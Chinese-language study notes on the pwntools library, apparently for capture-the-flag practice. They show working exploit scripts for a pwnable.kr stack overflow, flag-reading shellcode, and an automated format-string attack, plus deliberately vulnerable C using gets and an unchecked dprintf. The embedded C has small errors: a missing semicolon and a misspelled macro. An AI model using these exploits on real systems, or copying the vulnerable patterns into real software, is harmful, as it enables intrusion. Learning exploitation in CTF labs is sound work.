# Pwntool

## 栈溢出攻击例子

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else {
        printf("Nah..\n");
    }
}

int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

exploit.py

```python
from pwn import *
c = remote("pwnable.kr", 9000)
c.sendline("AAAA" * 13 + p32(0xcafebabe))
c.interactive()
```



`remote(ip , port)`连接到指定地址；

`remote`对象主要用来对远程主机的输入输出：

* `send(payload)`
* `sendline(payload)`
* `sendafter(some_string, payload)`
* `recvn(N)`
* `recvline()`
* `recvlines(N)`
* `recvuntil(some_string)`

`p32()`转换整数大小端序格式

`pwntools`不能自动计算偏移量，用户需要自行计算



## 写shellcode

```shell
ssh -p2222 asm@pwnable.kr guest

```



exploit.py

```python
from pwn import *

p = process("./asm")
context.log_level = 'DEBUG'
gdb.attach(p)

context(arch='amd64', os='linux')

shellcode = shellcraft.amd64.pushstr("this_is_pwnable.kr_flag_file_please_read...")
shellcode += shellcraft.amd64.linux.open('rsp',0,0)
shellcode += shellcraft.amd64.linux.read('rax', 'rsp', 0)
shellcode += shellcraft.amd64.linux.write(1, 'rsp', 100)

p.recvuntil('shellcode: ')
p.send(asm(shellcode))
log.success(p.recvall())
```

## 格式化漏洞自动化

```python
from pwn import *
import tempfile

program = tempfile.mktemp()
source = program + ".c"
write(source,'''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#define MEMORY_ADDRESS ((void*)0x11111000)
#define MOMORY_SIZE 1024
#define TARGET ((int*) 0x11111110)
int main(int argc, char const *argv[])
{
	char buff[1024];
	void *ptr = NULL;
	int *my_var = TARGET;
	ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
	if(ptr != MEMORY_ADDRESS)
	{
		perror("mmap")
		return EXIT_FAILURE;
	}
	*my_var = 0x41414141;
	write(1, &my_var, sizeof(int *));
	scanf("%s", buff);
	dprintf(2, buff);
	write(1, my_var, sizeof(int));
	return 0;
}
''')

cmdline = ["gcc", source, "-Wno-format-security", "-m32", "-o", program]
process(cmdline).wait_for_close()
def exec_fmt(payload):
    p = process(program)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
p = process(program , stderr=PIPE)
addr = u32(p.recv(4))
payload = fmtstr_payload(offset, {addr: 0x1337babe})
p.sendline(payload)
print(hex(unpack(p.recv(4))))
```

## ELF()

```python
from pwn import *

e = ELF('./example_file')
print hex(e.address)
print hex(e.symbols['write'])
print hex(e.got['write'])
print hex(e.plt['write'])
offset = e.symbols['system'] - e.symbols['printf']
binsh_address = next(e.search('/bin/sh\x00'))
```

